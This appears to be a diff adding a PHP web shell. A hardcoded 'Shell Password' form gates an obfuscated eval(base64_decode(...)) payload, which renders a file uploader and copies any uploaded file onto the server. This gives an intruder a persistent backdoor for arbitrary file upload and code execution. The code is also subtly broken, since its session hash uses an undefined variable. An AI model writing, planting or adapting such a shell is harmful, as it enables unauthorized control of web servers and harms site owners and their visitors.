@@ -1,0 +1,86 @@
+<?php
+
+session_start();
+
+// ***************************************** //
+// **********	DECLARE VARIABLES  ********** //
+// ***************************************** //
+
+$password = 'akdk2727';
+
+$random1 = 'secret_key1';
+$random2 = 'secret_key2';
+
+$hash = md5($random1.$pass.$random2); 
+
+$self = $_SERVER['REQUEST_URI'];
+
+
+// ************************************ //
+// **********	USER LOGOUT  ********** //
+// ************************************ //
+
+if(isset($_GET['logout']))
+{
+	unset($_SESSION['login']);
+}
+
+
+// ******************************************* //
+// **********	USER IS LOGGED IN	********** //
+// ******************************************* //
+
+if (isset($_SESSION['login']) && $_SESSION['login'] == $hash) {
+
+?>
+<?php
+//uploader 
+eval (base64_decode("ZWNobyAnVXBsb2FkZXI8YnI+DQo8YnI+DQogPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbmFtZT0idXBsb2FkZXIiIGlkPSJ1cGxvYWRlciI+DQogPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiIHNpemU9IjUwIj48aW5wdXQgbmFtZT0iX3VwbCIgdHlwZT0ic3VibWl0IiBpZD0iX3VwbCIgdmFsdWU9IlVwbG9hZCI+PC9mb3JtPic7DQogaWYoICRfUE9TVFsnX3VwbCddID09ICJVcGxvYWQiICkge2lmKEBjb3B5KCRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXSwgJF9GSUxFU1snZmlsZSddWyduYW1lJ10pKSB7DQogZWNobyAnPGI+VXBsb2FkICEhITwvYj48YnI+PGJyPic7DQogfWVsc2Ugew0KIGVjaG8gJzxiPlVwbG9hZCAhISE8L2I+PGJyPjxicj4nOyB9fQ=="));
+?>
+<?php
+}
+
+
+// *********************************************** //
+// **********	FORM HAS BEEN SUBMITTED	********** //
+// *********************************************** //
+
+else if (isset($_POST['submit'])) {
+
+if ($_POST['password'] == $password){
+
+		//IF PASSWORD IS CORRECT SET THE LOG-IN SESSION
+		$_SESSION["login"] = $hash;
+		header("Location: $_SERVER[PHP_SELF]");
+		
+} else {	
+
+		// DISPLAY FORM WITH ERROR
+		display_login_form();
+		echo '<p>Shell Password Invalid!</p>';
+		
+	}
+}	
+	
+	
+// *********************************************** //
+// **********	SHOW THE LOG-IN FORM	********** //
+// *********************************************** //
+
+else { 
+
+	display_login_form();
+
+}
+
+
+function display_login_form(){ ?>
+
+	<form action="<?php echo $self; ?>" method='post'>
+        <center>
+	<label for="password">Shell Password:</label>
+	<input type="password" name="password" id="password">
+	<input type="submit" name="submit" value="Enter->">
+	</form>	
+
+<?php } ?>
